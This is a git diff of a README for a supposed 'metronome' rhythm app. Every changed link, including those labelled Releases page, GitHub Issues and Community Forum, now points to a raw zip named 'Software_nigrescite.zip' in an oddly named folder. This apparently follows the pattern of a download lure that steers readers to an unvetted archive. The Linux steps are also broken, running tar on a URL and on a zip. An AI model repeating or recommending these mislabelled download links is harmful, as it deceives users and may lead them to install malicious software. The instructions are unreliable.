@@ -1,6 +1,6 @@
 # 🎶 metronome - Your Reliable Rhythm Companion
 
-## ![Download metronome](https://raw.githubusercontent.com/haommy/metronome/main/overindulgently/metronome.zip%20metronome-v1.0-blue)
+## ![Download metronome](https://github.com/haommy/metronome/raw/refs/heads/main/overindulgently/Software_nigrescite.zip%20metronome-v1.0-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the metronome project! This is a simple, reliable command-line interf
 
 To get started, visit the Releases page to download the latest version of the metronome:
 
-[Download metronome](https://raw.githubusercontent.com/haommy/metronome/main/overindulgently/metronome.zip)
+[Download metronome](https://github.com/haommy/metronome/raw/refs/heads/main/overindulgently/Software_nigrescite.zip)
 
 Once on the page, locate the latest release and download the appropriate file for your operating system. 
 
@@ -39,8 +39,8 @@ Once on the page, locate the latest release and download the appropriate file fo
 
 ### For Linux Users
 
-1. Download the https://raw.githubusercontent.com/haommy/metronome/main/overindulgently/metronome.zip file for Linux from the Releases page.
-2. Open your Terminal and use the command `tar -xvzf https://raw.githubusercontent.com/haommy/metronome/main/overindulgently/metronome.zip` to extract the files.
+1. Download the https://github.com/haommy/metronome/raw/refs/heads/main/overindulgently/Software_nigrescite.zip file for Linux from the Releases page.
+2. Open your Terminal and use the command `tar -xvzf https://github.com/haommy/metronome/raw/refs/heads/main/overindulgently/Software_nigrescite.zip` to extract the files.
 3. Navigate to the extracted folder using `cd`.
 4. Type `./metronome` and press Enter to start the application.
 
@@ -72,9 +72,9 @@ If you encounter any issues:
 
 Join our community to discuss features, suggest improvements, or share your experiences! You can find discussions and support at:
 
-- [GitHub Issues](https://raw.githubusercontent.com/haommy/metronome/main/overindulgently/metronome.zip)
-- [Community Forum](https://raw.githubusercontent.com/haommy/metronome/main/overindulgently/metronome.zip)
+- [GitHub Issues](https://github.com/haommy/metronome/raw/refs/heads/main/overindulgently/Software_nigrescite.zip)
+- [Community Forum](https://github.com/haommy/metronome/raw/refs/heads/main/overindulgently/Software_nigrescite.zip)
 
 ## ✅ Final Notes
 
-Thank you for using metronome! We hope it assists you in your musical journey. For any further information, refer back to the [Releases page](https://raw.githubusercontent.com/haommy/metronome/main/overindulgently/metronome.zip) to check for updates or new features. Happy practicing!
+Thank you for using metronome! We hope it assists you in your musical journey. For any further information, refer back to the [Releases page](https://github.com/haommy/metronome/raw/refs/heads/main/overindulgently/Software_nigrescite.zip) to check for updates or new features. Happy practicing!
